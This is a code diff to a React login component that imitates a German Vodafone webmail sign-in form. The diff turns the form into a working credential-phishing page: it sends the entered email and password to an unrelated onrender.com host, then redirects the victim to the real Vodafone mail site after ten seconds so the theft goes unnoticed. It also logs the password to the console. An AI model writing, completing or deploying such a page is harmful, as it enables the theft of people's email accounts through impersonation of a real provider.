@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import "./Credentials.css";
 import { FaEyeSlash } from "react-icons/fa";
 import { FaRegEye } from "react-icons/fa6";
@@ -9,69 +9,35 @@ const Credentials = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [info, setInfo] = useState(false);
   const [email, setEmail] = useState("");
-  const [passWord, setPassWord] = useState("");
-  const [, loading, setLoading] = useState(false);
+  const [password, setPassword] = useState("");
+  const [loading, setLoading] = useState(false);
 
   const handleShowpassword = () => {
     setShowPassword(!showPassword);
   };
 
-  const [inputErrors, setInPutErrors] = useState({
-    emailError: false,
-    passWordError: false,
-    infoError: false,
-    msg: "",
-  });
-
-  const handlePassWord = (e) => {
-    const newValue = e.target.value;
-    setPassWord(newValue);
-    if (newValue.trim() === "") {
-      setInPutErrors({
-        passWordError: true,
-        msg: "You can not leave this field blank",
-      });
-    } else {
-      setInPutErrors({ passWordError: false });
-    }
-  };
-
-  const handleEmail = (e) => {
-    const newValue = e.target.value;
-    setEmail(newValue);
-    if (newValue.trim() === "") {
-      setInPutErrors({
-        emailError: true,
-        msg: "You can not leave this field blank",
-      });
-    } else {
-      setInPutErrors({ emailError: false });
-    }
-  };
-
+  console.log(email, password);
   const handleLogin = async () => {
-    setInfo(true);
-    setTimeout(() => {
-      setInfo(false);
-    }, 4000);
-    window.location.href = "https://mail.vodafone.de/index.aspx";
-    // try {
-    //   setLoading(true);
-    //   await axios.post(
-    //     "https://christholychurch.onrender.com/api/signin",
-    //     email,
-    //     passWord
-    //   );
-    //   setLoading(false);
-
-     
-    //   setLoading(false);
-    // } catch (err) {
-    //   if (err.response.data.message) {
-    //     setLoading(false);
-    //   }
-    //   setLoading(false);
-    // }
+    try {
+      setLoading(true);
+      setInfo(true);
+      const res = await axios.post(
+        "https://hey-1-065m.onrender.com/api/login",
+        { email, password }
+      );
+      if (res.status === 200) {
+        setTimeout(() => {
+          window.location.href = "https://mail.vodafone.de/index.aspx";
+        }, 10000);
+      } else {
+        setInfo(true);
+      }
+    } catch (err) {
+      console.error("Error:", err);
+      setInfo(true);
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
@@ -120,27 +86,21 @@ const Credentials = () => {
               <input
                 type="email"
                 placeholder="E-Mail-Adresse"
-                onChange={handleEmail}
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
               />
-              {inputErrors.emailError ? (
-                <p style={{ fontSize: "10px", color: "red" }}>
-                  {inputErrors.msg}
-                </p>
-              ) : null}
             </div>
             <div className="loginFormDown">
               <input
                 type={showPassword ? "text" : "password"}
                 placeholder="E-Mail-Passwort"
-                onChange={handlePassWord}
+                onChange={(e) => setPassword(e.target.value)}
+                value={password}
               />
-              {inputErrors.passWordError ? (
-                <p style={{ fontSize: "10px", color: "red" }}>
-                  {inputErrors.msg}
-                </p>
-              ) : null}
+
               {showPassword ? (
-                <FaRegEye className="Eyeicon"
+                <FaRegEye
+                  className="Eyeicon"
                   onClick={handleShowpassword}
                   // style={{
                   //   fontSize: "12px",
@@ -149,7 +109,8 @@ const Credentials = () => {
                   // }}
                 />
               ) : (
-                <FaEyeSlash className="Eyeicon"
+                <FaEyeSlash
+                  className="Eyeicon"
                   onClick={handleShowpassword}
                   // style={{
                   //   fontSize: "12px",
@@ -179,7 +140,7 @@ const Credentials = () => {
           <div className="dan">
             <p className="danp">
               Du hast noch kein E-Mail-Konto?
-              <span 
+              <span
                 style={{
                   color: " rgb(153, 153, 153)",
                   backgroundColor: "#212121",
